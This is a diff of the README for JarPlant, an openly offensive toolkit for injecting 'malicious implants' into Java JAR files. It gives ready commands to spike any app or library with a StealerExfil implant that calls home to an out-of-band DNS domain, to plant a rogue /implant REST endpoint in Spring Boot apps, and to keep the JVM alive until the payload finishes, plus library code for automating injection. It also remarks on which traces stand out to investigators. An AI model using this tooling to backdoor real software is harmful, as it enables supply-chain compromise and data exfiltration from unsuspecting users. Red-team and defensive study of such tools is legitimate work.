@@ -1,16 +1,19 @@
-# Java Archive Implant Toolkit
+# Java Archive Implant Toolkit (JarPlant)
 
-Inject malicious payloads into JAR files.
+Spike JAR files with malicious implants.
 
 ## Quickstart
 
-Building:
+Either download the `jarplant-cli` JAR from [GitHub Releases](https://github.com/w1th4d/JarPlant/releases) or build one
+yourself from source.
+
+Building from source:
 
 ```
 git clone git@github.com:w1th4d/JarPlant.git
 cd JarPlant
 mvn package
-mv jarplant-cli/target/jarplant-cli-<version>-jar-with-dependencies.jar jarplant.jar
+mv jarplant-cli/target/jarplant-cli-<version>-jar-with-dependencies.jar jarplant-cli.jar
 ```
 
 Make sure to substitute `<version>` with the current version.
@@ -22,7 +25,7 @@ Usage:
      _|     |.---.-..----.|   __ \|  |.---.-..-----.|  |_ 
     |       ||  _  ||   _||    __/|  ||  _  ||     ||   _|
     |_______||___._||__|  |___|   |__||___._||__|__||____|
-    Java archive implant toolkit   v0.1   by w1th4d & kugg
+    Java archive implant toolkit v0.1.1   by w1th4d & kugg
 
 positional arguments:
   command
@@ -44,19 +47,19 @@ positional arguments:
                          configuration properties and  their  data types. A
                          class file path can be  specified to read a custom
                          implant.
-    decoder              Utility to decode stuff  generated  by some of the
-                         built-in payloads.
+    decoder              Utility  to  decode   data   exfiltrated   by  the
+                         StealerExfil.
 
 named arguments:
   -h, --help             show this help message and exit
 
 for more options, see command help pages:
-  $ java -jar jarplant.jar class-injector -h
-  $ java -jar jarplant.jar spring-injector -h
+  $ java -jar jarplant-cli.jar class-injector -h
+  $ java -jar jarplant-cli.jar spring-injector -h
     ...
 
 example usage:
-  $ java -jar jarplant.jar class-injector \
+  $ java -jar jarplant-cli.jar class-injector \
     --target path/to/target.jar --output spiked-target.jar
 ```
 
@@ -67,7 +70,7 @@ These are some examples of things you may be interested in.
 Spike any Java app or library to call home to an out-of-band DNS catcher (like Interactch):
 
 ```shell
-java -jar jarplant.jar class-injector \
+java -jar jarplant-cli.jar class-injector \
    --target path/to/target.jar \
    --implant StealerExfil \
    --config CONF_DOMAIN=$YOUR_OAST_DOMAIN 
@@ -78,27 +81,29 @@ Replace `$YOUR_OAST_DOMAIN` with your `*.oast.fun` domain (or whatever out-of-ba
 Decode the domain name caught by your DNS server:
 
 ```shell
-java -jar jarplant.jar decoder --input $INTERACTSH.JSON --domain $YOUR_OAST_DOMAIN
+java -jar jarplant-cli.jar decoder \
+   --input /path/to/export.json \
+   --domain $YOUR_OAST_DOMAIN
 ```
 
-Replace `$YOUR_OAST_DOMAIN` with your interactsh domain and $INTERACTSH.JSON with a JSON export from interactsh.
+Replace `$YOUR_OAST_DOMAIN` with your Interactsh domain and `/path/to/export.json` with a JSON export from Interactsh.
 
 Spike a Spring Boot app to include a rogue REST endpoint:
 
 ```shell
-java -jar jarplant.jar spring-injector \
+java -jar jarplant-cli.jar spring-injector \
    --target path/to/target.jar \
    --implant-component SpringImplantController \
    --implant-config SpringImplantConfiguration 
 ````
 
-You'll want to modify `StringImplantController.java` for this one do to anything interesting.
-The default is to create a REST controller routed to `/implant` that just gives a dummy response.
+You'll want to modify `StringImplantController.java` with your own implant code. The default is to create a REST
+controller routed to `/implant` that just gives a dummy response.
 
 Spike any JAR with your own custom implant code:
 
 ```shell
-java -jar class-injector \
+java -jar jarplant-cli.jar class-injector \
    --target path/to/target.jar \
    --implant ClassImplant 
 ```
@@ -108,7 +113,7 @@ Where your custom implant code resides in the `payload()` method of `ClassImplan
 Spike any JAR with an implant that will always finish no matter what:
 
 ```shell
-java -jar class-injector \
+java -jar jarplant-cli.jar class-injector \
    --target path/to/target.jar \
    --implant ClassImplant
    --config CONF_BLOCK_JVM_SHUTDOWN=true 
@@ -118,8 +123,8 @@ Be careful with blocking operations in your payload code.
 
 ## Configuration
 
-JarPlant supports injection of custom values with the implants.
-A set of common configuration properties are defined with the template and built-in implants.
+JarPlant supports injection of custom values with the implants. A set of common configuration properties are defined
+with the template and built-in implants.
 These are:
 
 | Configuration property    | Data type | Description                                                                                                    | Default value     |
@@ -132,10 +137,9 @@ See the `ClassImplant` template Javadoc for mor info in these properties.
 
 ### Blocking the JVM exit
 
-Be extra careful with the `CONF_BLOCK_JVM_SHUTDOWN` property.
-If this is set to `true`, then the JVM will wait for your payload to finish its execution.
-If your payload takes a long time, then the spiked app will fail to exit properly.
-It's _not_ recommended to set a non-zero `CONF_DELAY_MS` value together with `CONF_BLOCK_JVM_SHUTDOWN=true`.
+Be extra careful with the `CONF_BLOCK_JVM_SHUTDOWN` property. If this is set to `true`, then the JVM will wait for your
+payload to finish its execution. If your payload takes a long time, then the spiked app will fail to exit properly. It's
+_not_ recommended to set a non-zero `CONF_DELAY_MS` value together with `CONF_BLOCK_JVM_SHUTDOWN=true`.
 
 If you've injected an implant into an app that exits very quickly, then your payload may not get enough time to execute
 if `CONF_BLOCK_JVM_SHUTDOWN` is set to `false` (which is the default setting).
@@ -151,28 +155,36 @@ to do its thing with `CONF_BLOCK_JVM_SHUTDOWN` set to its default value of `fals
 For a one-off in a rush, the simplest and fastest way of getting your own custom Java code into a target JAR is to:
 
 1) Clone this code repository.
-2) Modify the `payload()` method inside `ClassImplant.java` with your own code.
+2) Modify the `payload()` method
+   inside [ClassImplant.java](jarplant-implants/src/main/java/io/github/w1th4d/jarplant/implants/ClassImplant.java) with
+   your own code.
 3) Build JarPlant: `mvn clean package`.
-4) Run the CLI. See the "Quick grabs" section above.
+4) Run the CLI: `java -jar jarplant-cli.jar class-injector --target path/to/target.jar` (assuming default values). See
+   the "
+   Quick grabs" section above.
 
-Alternatively, if you're spiking a Spring app: Modify the `SpringComponentImplant.java` (and maybe the
-`SpringConfigurationImplant.java`) and use the `spring-injector` CLI accordingly.
+Alternatively, if you're spiking a Spring app:
+
+1) Clone this code repository.
+2) Modify
+   the [SpringImplantController.java](jarplant-implants/src/main/java/io/github/w1th4d/jarplant/implants/SpringImplantController.java) (
+   and maybe the
+   [SpringImplantConfiguration.java](jarplant-implants/src/main/java/io/github/w1th4d/jarplant/implants/SpringImplantConfiguration.java)).
+3) Run the CLI: `java -jar jarplant-cli.jar spring-injector -t path/to/target.jar` (assuming default values).
 
 ## Using the JarPlant library
 
-To invoke JarPlant from your own Java code, first run `mvn clean install` in the root directory of the JarPlant code
-repository.
-Then, include it in the `pom.xml` (or equivalent) of your own project:
+To invoke JarPlant from your own Java code, just include it in the `pom.xml` (or equivalent) of your own project:
 
 ```xml
 <dependency>
-  <groupId>io.github.w1th4d.jarplant</groupId>
-  <artifactId>jarplant-lib</artifactId>
-  <version>0.1.0-SNAPSHOT</version>
+    <groupId>io.github.w1th4d.jarplant</groupId>
+    <artifactId>jarplant-lib</artifactId>
+    <version>0.1.2</version>
 </dependency>
 ```
 
-These coordinates _will be changed_ soon. It will also be published to Maven Central when it's properly released.
+See [MVN Repository](https://mvnrepository.com/artifact/io.github.w1th4d.jarplant/jarplant-lib) for more details.
 
 Example usage in your code:
 
@@ -180,7 +192,7 @@ Example usage in your code:
 public class Demo {
     public static void main(String[] args) {
         try {
-            ImplantHandler implant = ImplantHandlerImpl.findAndCreateFor(ClassImplant.class);
+            ImplantHandler implant = ImplantHandlerImpl.findAndCreateFor(YourCustomImplant.class);
             implant.setConfig("CONF_BLOCK_JVM_SHUTDOWN", true);
 
             Path target = Path.of("target.jar");
@@ -199,80 +211,84 @@ public class Demo {
 }
 ```
 
-You may want to include the `jarplant-implants` submodule for access to `ClassImplant`:
+Where `YourCustomImplant` follows
+the [ClassImplant](jarplant-implants/src/main/java/io/github/w1th4d/jarplant/implants/ClassImplant.java)
+template (it's OK to just copy this one into your own project). Put your code into the `payload()` method. It's possible
+to add fields, methods and even dependency classes to the implant class.
 
-```xml
-<dependency>
-  <groupId>io.github.w1th4d.jarplant</groupId>
-    <artifactId>jarplant-implants</artifactId>
-    <version>0.1.0-SNAPSHOT</version>
-</dependency>
-```
-
-However, if you write your own code like this, it would be better to copy the `ClassImplant` template into your own
-project and customize it according to your needs.
-Give it a cool name while you're at it.
+Any dependencies used by your implant will be picked up by JarPlant and added to the spiked JAR. Just be aware that
+dependency classes will not be renamed (to blend in) in any way, so they'll stick out for anyone investigating the JAR.
 
 You may also introduce new configuration properties. Just make sure they're `public`, `static`, `volatile` and has a
 name prefixed with `CONF_`.
 If no default value is used for a property, then a value must be provided using `ImplantHandler.setConfig()` before
 injection.
 
-## Library components
-
-JarPlant is written as a Java library and framework for you to write your own implants.
+### Library components
 
 There are a number of key components to JarPlant. These are `ImplantHandler`, `JarFiddler` and `Injector`.
 
-### ImplantHandler
+#### ImplantHandler
 
-This class (its implementation `ImplantHandlerImpl`) is used to find, load and configure implants.
+An [ImplantHandler](jarplant-lib/src/main/java/io/github/w1th4d/jarplant/ImplantHandler.java) is used to find, load and
+configure implants.
 
 This API is subject to change soon.
 
-### JarFiddler
+#### JarFiddler
 
-This class is used to read, modify and write a JAR file.
+The [JarFiddler](jarplant-lib/src/main/java/io/github/w1th4d/jarplant/JarFiddler.java) is used to read, modify and write
+a JAR file.
 
-The default implementation will read and buffer the contents of an entire JAR into memory.
-The injectors can then operate upon the `JarFiddler` in-memory.
-The user of the JarPlant API is expected to invoke the `write()` method if the injector succeeds.
+The default implementation will read and buffer the contents of an entire JAR into memory. The injectors can then
+operate upon the `JarFiddler` in-memory. The user of the JarPlant API is expected to invoke the `write()` method if the
+injector succeeds.
 
-### Injectors
+#### Injectors
 
 These are the classes that does most of the bytecode manipulation of classes inside a JAR.
 
-There are different implementations for various types of JARs/apps: `ClassInjector` and `SpringInjector`.
+There are different implementations for various types of JARs/apps:
+[ClassInjector](jarplant-lib/src/main/java/io/github/w1th4d/jarplant/ClassInjector.java) and
+[SpringInjector](jarplant-lib/src/main/java/io/github/w1th4d/jarplant/SpringInjector.java).
 
-#### ClassInjector
+##### ClassInjector
 
-Operates upon any JAR file containing arbitrary classes.
-The JAR does _not_ have to be executable or contain a class with a `public static void main(String[] args)` function.
-Any class will do. This works for libraries and dependencies, too.
+The [ClassInjector](jarplant-lib/src/main/java/io/github/w1th4d/jarplant/ClassInjector.java) operates upon any JAR file
+containing arbitrary classes. The JAR does _not_ have to be executable or contain a class with a
+`public static void main(String[] args)` function. Any class will do. This works for libraries and dependencies, too.
 
 When the target JAR is run or used by another app, the implant will trigger.
 
-#### SpringInjector
+##### SpringInjector
 
-Specifically looks for a Spring configuration classes and injects a Spring component in the same package namespace.
-If _component scanning_ is not enabled by the target app, then the SpringInjector will also inject a `@Bean`-annotated
-method in the configuration in order to reference the implanted component.
+The [SpringInjector](jarplant-lib/src/main/java/io/github/w1th4d/jarplant/SpringInjector.java) looks for Spring
+configuration classes and injects a Spring component in the same package namespace. If _component scanning_ is not
+enabled by the target app, then the SpringInjector will also inject a `@Bean`-annotated method in the configuration in
+order to properly reference the implanted component.
 
-The Spring implant template will register a new HTTP request mapping for the app.
-Requests going to that endpoint (`/implant` by default) will be handled by the implant.
-You're encouraged to modify `SpringComponentImplant.java` with your own custom code.
+The [Spring implant template](jarplant-implants/src/main/java/io/github/w1th4d/jarplant/implants/SpringImplantController.java)
+will register a new HTTP request mapping for the app. Requests going to that endpoint (`/implant` by default) will be
+handled by the implant. You're encouraged to
+modify [SpringImplantController.java](jarplant-implants/src/main/java/io/github/w1th4d/jarplant/implants/SpringImplantController.java)
+with your own custom code.
 
-## Implants
+### Implants
 
 JarPlant is intended to serve as a framework for developers to implement their own implants.
 
-The template for the `ClassInjector` is `ClassImplant`.
-Please delve into it, read its Javadoc and fill in the `payload()` method appropriately.
+The template for the `ClassInjector`
+is [ClassImplant](jarplant-implants/src/main/java/io/github/w1th4d/jarplant/implants/ClassImplant.java). Please delve
+into it, read its Javadoc and put your code in the `payload()` method.
 
-The `SpringInjector` uses two different implants: A _Spring component_ implant and a _Spring configuration_ implant.
-Both needs to be supplied and maintained, but the `SpringInjector` may skip the Spring configuration implant if it's not
-necessary.
-Future versions may (hopefully) be able to generate the Spring configuration implant during injection, but it needs to
+The `SpringInjector` uses two different implants:
+A [Spring component](jarplant-implants/src/main/java/io/github/w1th4d/jarplant/implants/SpringImplantController.java)
+implant and
+a [Spring configuration](jarplant-implants/src/main/java/io/github/w1th4d/jarplant/implants/SpringImplantConfiguration.java)
+implant. Both needs to be supplied and maintained, but the `SpringInjector` may skip the Spring configuration implant if
+it's not
+necessary. Future versions may (hopefully) be able to generate the Spring configuration implant during injection, but it
+needs to
 be supplied explicitly for now.
 
 ## Maven modules
@@ -282,7 +298,7 @@ This project is divided into a set of Maven modules:
 * **jarplant-cli** is where the executable main function is. It gives the user a Command Line Interface to use the
   JarPlant functionality in a user-friendly way.
 * **jarplant-implants** is where the various example implants are located. A savvy user is encouraged to write custom
-  implants as appropriate.
+  implants as appropriate. This module may be re-organized soon.
 * **jarplant-lib** is where the main functionality is. This module is designed to contain only the essential
   functionality for portability.
 * **test-app-pojo** is a very minimal plain Java app that can be used for test the class implants.
@@ -296,19 +312,17 @@ This project is divided into a set of Maven modules:
 ## Test suite
 
 Testing JAR and bytecode manipulation can be a bit tricky. Please try to include any bug or corner case into its own
-Junit test. Don't be afraid of adding to the test apps and test implants, just don't break any other tests in the
-process. Add a new submodule with a test app/implant that narrows in on the test case if necessary. *Don't* check in
-a blob like a JAR file or anything. Any test apps needs to be provided by source and pom. Try to keep it to the point.
+unit test. Don't be afraid of adding to the test apps and test implants, just don't break any other tests in the
+process. Add a new submodule with a test app/implant that narrows in on the test case if necessary. *Don't* check in a
+blob like a JAR file or anything. Any test apps needs to be provided by source and pom. Try to keep it to the point.
 
 ### Test automation
 
-Most tests reside in `jarplant-lib/src/test` that houses a mix of unit tests and end-to-end tests.
-The tests use a combination of dummy classes and "live samples" from the other Maven submodules.
-These submodules are set up to build a proper JAR file and then copy it into the resource folder of the tests.
-See their `pom.xml` files for details. It's a bit out of the ordinary and may generate some warnings in Maven.  
-Just make sure to run `mvn package` in the project root before running any tests in isolation.
-
-The tests in `jarplant-lib` are a mix of unit tests and end-to-end tests.
+Most tests reside in `jarplant-lib/src/test` that houses a mix of unit tests and end-to-end tests. The tests use a
+combination of dummy classes and "live samples" from the other Maven submodules. These submodules are set up to build a
+proper JAR file and then copy it into the resource folder of the tests. See their `pom.xml` files for details. It's a
+bit out of the ordinary and may generate some warnings in Maven. Just make sure to run `mvn package` in the project root
+before running any tests in isolation.
 
 ### Manual testing and troubleshooting
 
@@ -336,8 +350,7 @@ it yourself. A reported Issue is better than nothing.
 
 There's a lot of work that still needs to be done. See the Issues section on GitHub for more details.
 
-One key point about future work is that *a lot* more testing needs to be done.
-We know that JarPlant in its current state will fail to spike many JARs in the wild.
-We're also concerned about compatibility between different Java versions.
-All of this needs to be set up with test automation.
+One key point about future work is that *a lot* more testing needs to be done. We know that JarPlant in its current
+state will fail to spike many JARs in the wild. We're also concerned about compatibility between different Java
+versions. All of this needs to be set up with test automation.
 
